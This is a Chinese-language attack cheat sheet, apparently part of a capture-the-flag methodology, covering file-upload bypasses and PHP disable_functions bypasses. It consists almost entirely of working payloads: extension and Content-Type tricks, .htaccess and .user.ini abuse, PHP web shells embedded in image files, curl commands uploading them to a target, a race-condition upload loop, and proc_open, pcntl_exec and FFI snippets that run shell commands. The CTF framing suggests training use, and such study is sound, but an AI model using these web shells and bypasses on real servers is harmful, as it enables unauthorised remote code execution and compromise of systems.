## 阶段五：文件上传绕过

### 5.1 扩展名绕过
```
.php → .pHp / .php3 / .php4 / .php5 / .phtml / .pht
.jsp → .jspx / .jspa / .jspf
.asp → .asa / .asax / .ascx / .ashx / .asmx / .cer
双扩展：shell.php.jpg / shell.jpg.php
空字节：shell.php%00.jpg（PHP < 5.3.4）
.htaccess 上传：AddType application/x-httpd-php .jpg
.user.ini：auto_prepend_file=shell.jpg
```

### 5.2 Content-Type 绕过
```bash
curl -X POST http://TARGET/upload \
  -F "file=@shell.php;type=image/jpeg"

# 保留图片头 + PHP 代码
printf '\xff\xd8\xff\xe0<?php system($_GET["cmd"]); ?>' > shell.php.jpg
```

### 5.3 内容检测绕过
```bash
# 图片马
cp legit.jpg shell.jpg
echo '<?php system($_GET["cmd"]); ?>' >> shell.jpg

# 短标签
<?= system($_GET['cmd']); ?>

# 反引号
<?= `$_GET[cmd]`; ?>

# 条件竞争
while true; do curl -s -X POST http://TARGET/upload -F "file=@shell.php"; done &
while true; do curl -s "http://TARGET/uploads/shell.php?cmd=cat+/flag" | grep -o "flag{.*}"; done
```

---

## 阶段六：PHP disable_functions 绕过

```php
// LD_PRELOAD 劫持
// pcntl_exec（如果未禁用）
pcntl_exec("/bin/cat", ["/flag"]);

// proc_open
$process = proc_open('cat /flag', [['pipe','r'],['pipe','w'],['pipe','w']], $pipes);
echo stream_get_contents($pipes[1]);

// FFI（PHP 7.4+）
$ffi = FFI::cdef("int system(const char *command);");
$ffi->system("cat /flag");
```

---

